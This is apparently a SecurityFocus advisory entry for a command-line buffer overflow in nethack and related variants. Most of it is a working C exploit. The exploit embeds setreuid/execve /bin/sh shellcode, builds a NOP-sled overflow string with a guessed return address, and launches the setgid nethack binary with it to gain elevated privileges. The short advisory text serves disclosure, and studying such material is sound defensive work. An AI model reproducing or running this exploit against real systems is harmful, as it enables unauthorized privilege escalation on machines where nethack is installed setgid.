source: http://www.securityfocus.com/bid/6806/info

By passing an overly large string when invoking nethack, it is possible to corrupt memory.

By exploiting this issue it may be possible for an attacker to overwrite values in sensitive areas of memory, resulting in the execution of arbitrary attacker-supplied code. As nethack may be installed setgid 'games' on various systems this may allow an attacker to gain elevated privileges.

slashem, jnethack and falconseye are also prone to this vulnerability.

/*
        tsao@efnet #!IC@efnet 2k3
        thnx to aleph1 for execve shellcode &
        davidicke for setreuid() shellcode
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


char code[] =

"\x29\xc4\x31\xc0\x31\xc9\x31\xdb\xb3\x0c\x89\xd9\xb0\x46\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";



unsigned long sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char **argv) {
     char *p;
     int i, off;

     p = malloc(sizeof(char) * atoi(argv[1]));
     memset(p,0x90,atoi(argv[1]));

     off = 220 - strlen(code);
     printf("shellcode at %d->%d\n",off,off+strlen(code));
     for(i=0;i<atoi(argv[1]);i++)
       p[i+off] = code[i];


     *(long *) &p[220] = sp() - atoi(argv[2]);
     printf("Using %x\n",sp() - atoi(argv[2]));

     execl("/usr/games/lib/nethackdir/nethack","nethack","-s",p,0);
     perror("wtf");
}